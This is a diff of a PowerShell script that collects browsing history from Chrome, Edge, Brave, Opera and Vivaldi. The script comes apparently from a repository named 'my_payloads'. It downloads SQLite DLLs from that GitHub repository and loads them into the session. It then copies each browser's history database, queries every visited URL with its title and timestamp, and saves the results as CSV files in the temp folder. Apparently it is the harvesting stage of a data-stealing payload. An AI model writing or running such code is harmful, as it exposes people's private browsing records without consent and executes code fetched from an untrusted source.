@@ -1,69 +1,77 @@
-# Define paths to browser history databases
-$ChromeHistoryDB = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
-$EdgeHistoryDB = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
-
-# Temporary copy (browsers lock original DB)
-$TempDB = "$env:TEMP\BrowserHistory.db"
-
-# Copy Chrome or Edge history file (whichever exists)
-if (Test-Path $ChromeHistoryDB) {
-    Copy-Item -Path $ChromeHistoryDB -Destination $TempDB -Force
-    $Browser = "Google Chrome"
-} elseif (Test-Path $EdgeHistoryDB) {
-    Copy-Item -Path $EdgeHistoryDB -Destination $TempDB -Force
-    $Browser = "Microsoft Edge"
-} else {
-    Write-Output "No browser history database found!"
-    exit
+# Define browser paths
+$BrowserHistoryPaths = @{
+    "Google_Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
+    "Microsoft_Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
+    "Brave"          = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\History"
+    "Opera"          = "$env:APPDATA\Opera Software\Opera Stable\History"
+    "Vivaldi"        = "$env:LOCALAPPDATA\Vivaldi\User Data\Default\History"
+    "Firefox"        = "$env:APPDATA\Mozilla\Firefox\Profiles"
 }
 
-# Define path to SQLite DLL
+# SQLite DLL Paths
 $SQLiteDllPath = "$env:TEMP\System.Data.SQLite.dll"
 $SQLiteInteropPath = "$env:TEMP\SQLite.Interop.dll"
 
-# Download SQLite DLL if not already present
-if (-not (Test-Path $SQLiteDllPath -PathType Leaf)) {
-    Write-Output "Downloading System.Data.SQLite..."
+# Download SQLite DLLs if missing
+if (-not (Test-Path $SQLiteDllPath)) {
     Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Data.SQLite.dll" -outfile $SQLiteDllPath
 }
-
-if (-not (Test-Path $SQLiteInteropPath -PathType Leaf)) {
-    Write-Output "Downloading SQLite.Interop.dll..."
+if (-not (Test-Path $SQLiteInteropPath)) {
     Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/SQLite.Interop.dll" -outfile $SQLiteInteropPath
 }
 
 # Load SQLite Assembly
 Add-Type -Path $SQLiteDllPath
 
-# Query SQLite database for browsing history
-$Query = "SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') AS last_visited FROM urls ORDER BY last_visit_time DESC"
+# Iterate through detected browsers
+foreach ($Browser in $BrowserHistoryPaths.Keys) {
+    $HistoryDB = $BrowserHistoryPaths[$Browser]
 
-# Execute the query
-$Connection = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$TempDB;Version=3;"
-$Connection.Open()
+    if (Test-Path $HistoryDB) {
+        # Create a temporary copy to avoid file lock issues
+        $TempDB = "$env:TEMP\${Browser}_History.db"
+        Copy-Item -Path $HistoryDB -Destination $TempDB -Force
 
-$Command = $Connection.CreateCommand()
-$Command.CommandText = $Query
+        # SQLite query to extract full browsing history
+        $Query = "SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') AS last_visited FROM urls ORDER BY last_visit_time DESC"
 
-$Reader = $Command.ExecuteReader()
-$History = @()
+        # Connect to SQLite database
+        $Connection = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$TempDB;Version=3;"
+        $Connection.Open()
 
-while ($Reader.Read()) {
-    $History += [PSCustomObject]@{
-        URL         = $Reader["url"]
-        Title       = $Reader["title"]
-        LastVisited = $Reader["last_visited"]
+        # Execute query
+        $Command = $Connection.CreateCommand()
+        $Command.CommandText = $Query
+        $Reader = $Command.ExecuteReader()
+
+        # Store history
+        $History = @()
+        while ($Reader.Read()) {
+            $History += [PSCustomObject]@{
+                URL         = $Reader["url"]
+                Title       = $Reader["title"]
+                LastVisited = $Reader["last_visited"]
+            }
+        }
+
+        # Close connection
+        $Reader.Close()
+        $Connection.Close()
+
+	Write-Output "Browsing History from ${Browser}:"
+	$History | Format-Table -AutoSize
+
+        # Save history to CSV
+        $CsvPath = "$env:TEMP\$Browser-History.csv"
+        $History | Export-Csv -Path $CsvPath -NoTypeInformation
+
+        # Output result
+        Write-Output "History saved: $CsvPath"
+
+	Start-Sleep -seconds 5
+        # Cleanup temp files
+        Remove-Item -Path $TempDB -Force
+    }else{
+    	Write-Output "The ${Browser} history file has not been found."
     }
 }
-
-$Reader.Close()
-$Connection.Close()
-
-# Display extracted history
-Write-Output "Browsing History from ${Browser}:"
-$History | Format-Table -AutoSize
-$History | Export-Csv -Path "$env:TEMP\BrowserHistory.csv" -NoTypeInformation
-
-
-# Clean up temp files
-Remove-Item -Path $TempDB -Force
